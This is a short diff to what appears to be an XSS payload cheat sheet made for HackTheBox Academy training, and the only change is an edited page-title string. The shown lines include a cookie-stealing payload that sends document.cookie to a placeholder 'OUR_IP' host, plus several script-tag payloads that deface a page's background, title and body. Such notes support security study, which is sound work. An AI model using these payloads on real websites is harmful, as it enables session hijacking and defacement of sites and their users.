@@ -36,7 +36,7 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ###### DEFACING ######
 <script>document.body.style.background = "#141d2b"</script>
 <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
-<script>document.title = 'HackTheBox Academy'</script>
+<script>document.title = 'HackABooooooooooo'</script>
 <script>document.getElementById("todo").innerHTML = "New Text"</script>
 <script>document.getElementsByTagName('body')[0].innerHTML = "New Text"</script>
 <script>document.write()</script>
